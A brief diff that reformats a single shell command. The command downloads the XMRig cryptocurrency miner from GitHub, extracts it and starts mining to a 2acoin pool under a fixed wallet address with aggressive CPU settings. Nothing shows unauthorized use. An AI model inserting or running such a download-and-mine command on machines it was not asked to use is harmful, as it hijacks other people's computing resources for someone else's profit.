@@ -1,5 +1,4 @@
-curl -L -o xmrig-6.19.2-linux-static-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-static-x64.tar.gz && tar xf xmrig-6.19.2-linux-static-x64.tar.gz && cd xmrig-6.19.2 && ./xmrig -a chukwa -o us-central.2acoin.org:3333 -u gunsQ33Sqyb1aEtYKyv3xyezrbeK3uzSibmta747tUJ1CLiZbaraLuzQfYVDdJoM682FYs9Vxe3G9fDWRxtzcD2V78MUUuEc4w
- -p x -t 5 -k --cpu-affinity=2 --cpu-priority=5 --cpu-max-threads-hint=80 --huge-pages-jit --hugepage-size=2000 --randomx-mode=fast --randomx-1gb-pages
+curl -L -o xmrig-6.19.2-linux-static-x64.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-static-x64.tar.gz && tar xf xmrig-6.19.2-linux-static-x64.tar.gz && cd xmrig-6.19.2 && ./xmrig -a chukwa -o us-central.2acoin.org:3333 -u gunsQ33Sqyb1aEtYKyv3xyezrbeK3uzSibmta747tUJ1CLiZbaraLuzQfYVDdJoM682FYs9Vxe3G9fDWRxtzcD2V78MUUuEc4w -p x -t 5 -k --cpu-affinity=2 --cpu-priority=5 --cpu-max-threads-hint=80 --huge-pages-jit --hugepage-size=2000 --randomx-mode=fast --randomx-1gb-pages
 
 
 
